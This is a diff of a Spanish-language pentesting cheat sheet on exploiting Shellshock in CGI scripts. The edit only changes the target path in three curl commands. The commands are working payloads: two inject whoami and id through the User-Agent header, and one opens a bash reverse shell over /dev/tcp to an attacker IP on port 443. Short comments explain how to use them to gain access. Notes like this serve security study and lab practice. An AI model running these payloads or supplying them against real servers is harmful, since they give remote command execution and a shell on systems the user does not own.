@@ -23,7 +23,7 @@ En esos directorios debemos de buscar archivos **pl, sh, cgi,** asi como tambien
 * [ShellShock-Attack](https://blog.cloudflare.com/inside-shellshock/)
 
 ```bash 
-curl -s http://<IP>/cgi-bin/ -H "User-Agent: () { :; }; /usr/bin/whoami" 
+curl -s http://<IP>/cgi-bin/file -H "User-Agent: () { :; }; /usr/bin/whoami" 
 
 	# s = Silence 
 	# H = Cabecera para el ataque de ShellShock
@@ -31,13 +31,13 @@ curl -s http://<IP>/cgi-bin/ -H "User-Agent: () { :; }; /usr/bin/whoami"
 
 
 # Si al momento de ejecutar el comando anterior no nos reporta el comando, debemos de colocar un echo antes o hasta dos antes.
-curl -s http://<IP>/cgi-bin/ -H "User-Agent: () { :; }; echo; /usr/bin/id" 
+curl -s http://<IP>/cgi-bin/file -H "User-Agent: () { :; }; echo; /usr/bin/id" 
 
 	# Podemos colocar la ruta de cualquier comando, esperando a que la maquina tenga ese comando instalado. 
 
 
 # Podemos usar el ShellShock para ganar acceso a la maquina.
-curl -s http://<IP>/cgi-bin/ -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP-Atacante>/443 0>&1'" 
+curl -s http://<IP>/cgi-bin/file -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/<IP-Atacante>/443 0>&1'" 
 
 	# Otra ruta del bash por si no funciona es '/usr/bin/bash' 
 ```
